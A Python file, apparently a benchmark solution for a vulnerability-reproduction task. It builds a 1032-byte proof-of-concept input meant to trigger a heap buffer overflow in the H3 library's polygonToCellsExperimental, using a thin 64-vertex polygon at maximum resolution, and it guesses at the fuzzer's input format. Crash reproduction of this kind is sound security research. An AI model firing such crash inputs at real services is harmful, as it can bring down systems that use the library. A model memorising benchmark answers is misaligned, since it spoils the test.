import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        
        Based on the ground-truth length of 1032 bytes and the nature of the target (H3 library),
        the expected input format for the fuzzer is likely:
        - 4 bytes: Resolution (int32)
        - 4 bytes: Number of vertices (int32)
        - N * 16 bytes: Array of (lat, lon) doubles
        
        Calculation:
        1032 (Total) - 4 (Res) - 4 (Count) = 1024 bytes for vertices.
        1024 / 16 (sizeof(double)*2) = 64 vertices.
        
        The vulnerability is a heap buffer overflow due to under-estimation of the required buffer size
        in `polygonToCellsExperimental`. This often occurs with specific geometries (e.g., thin polygons)
        at high resolutions where the estimation heuristic fails to account for all cells.
        """
        
        # Target H3 resolution 15 (maximum) to maximize the number of cells and stress the estimation logic
        res = 15
        num_verts = 64
        
        # Generate a polygon with 64 vertices.
        # To trigger under-estimation, we create a very long, thin polygon (a "sliver").
        # This maximizes the perimeter-to-area ratio.
        coords = []
        
        # Create a strip from (0, 0) to (0, 10) and back
        # 32 vertices along the "bottom" edge
        for i in range(32):
            lat = 0.0
            lon = 10.0 * (i / 31.0)
            coords.append((lat, lon))
            
        # 32 vertices along the "top" edge, offset by a tiny epsilon
        for i in range(32):
            lat = 0.000001
            lon = 10.0 * ((31 - i) / 31.0)
            coords.append((lat, lon))
            
        # Construct the binary payload (Little Endian for standard fuzzing targets)
        payload = bytearray()
        payload.extend(struct.pack("<i", res))       # Resolution
        payload.extend(struct.pack("<i", num_verts)) # Vertex count
        
        for lat, lon in coords:
            payload.extend(struct.pack("<d", lat))
            payload.extend(struct.pack("<d", lon))
            
        return bytes(payload)